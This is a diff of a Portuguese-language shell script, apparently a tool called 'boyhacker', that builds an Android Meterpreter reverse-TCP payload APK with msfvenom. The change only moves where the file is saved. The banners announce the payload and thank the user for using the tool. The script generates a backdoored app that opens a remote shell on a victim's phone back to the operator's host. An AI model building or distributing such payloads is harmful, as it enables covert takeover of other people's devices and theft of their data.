@@ -34,7 +34,7 @@ read apk
 CLARO="\033[33m"
 PRETO="\033[30m" 
 echo -e "${CLARO} CRIANDO PAYLOAD...AGUARDE"
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno LPORT=$porta R > $apk.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno LPORT=$porta R > /root/boyhacker/$apk.apk
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${PRETO}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${PRETO}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
